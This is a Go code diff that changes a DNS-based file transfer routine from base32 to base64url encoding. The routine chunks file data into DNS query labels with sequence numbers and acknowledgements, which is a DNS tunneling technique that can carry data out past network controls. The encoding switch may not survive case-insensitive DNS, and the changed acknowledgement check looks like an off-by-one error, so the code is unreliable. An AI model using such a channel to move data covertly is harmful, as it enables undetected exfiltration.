@@ -23,7 +23,7 @@ var (
 		(float64(255-jobIdLength-len(dns.DomainName)-8) / 64.0) * 63,
 	))
 
-	chunkSize  = (maxCharacters * 5) / 8 //base32 encoding
+	chunkSize  = (maxCharacters * 3) / 4 //base64 encoding
 	timeout, _ = time.ParseDuration("6300ms")
 )
 
@@ -91,7 +91,7 @@ func (t *Transfer) Send() string {
 				}
 
 				timer.Reset(timeout)
-				if maxAck == uint32(t.TotalChunks-1) {
+				if maxAck == uint32(t.TotalChunks) {
 					return "ok"
 				}
 			}
@@ -112,12 +112,12 @@ func getNextPayload(t *Transfer) string {
 
 	chunk := make([]byte, length)
 	t.Reader.ReadAt(chunk, start)
-	chunkStr := encoding.Base32Encode(chunk)
+	chunkStr := encoding.Base64UrlEncode(chunk)
 	chunkStrArr := utils.SplitStringArrByLength(chunkStr, 63) // DNS labels have max 63 chars each
 	utils.ReverseStringArr(chunkStrArr)
 	var seqBytes [4]byte
 	binary.LittleEndian.PutUint32(seqBytes[:], t.nextSeq)
-	chunkStrArr = append(chunkStrArr, encoding.Base32Encode(seqBytes[:]))
+	chunkStrArr = append(chunkStrArr, encoding.Base64UrlEncode(seqBytes[:]))
 	return strings.Join(chunkStrArr, ".")
 }
 
@@ -126,8 +126,8 @@ func sendInitialData(t *Transfer) {
 	for {
 		var totalChunkBytes [4]byte
 		binary.LittleEndian.PutUint32(totalChunkBytes[:], uint32(t.TotalChunks))
-		req := encoding.Base32Encode(totalChunkBytes[:]) + "." +
-			encoding.Base32Encode([]byte("totalchunks")) + "." +
+		req := encoding.Base64UrlEncode(totalChunkBytes[:]) + "." +
+			encoding.Base64UrlEncode([]byte("totalchunks")) + "." +
 			t.JobId
 		res, _ := dns.DnsQuery(req)
 		if res == "ok" {
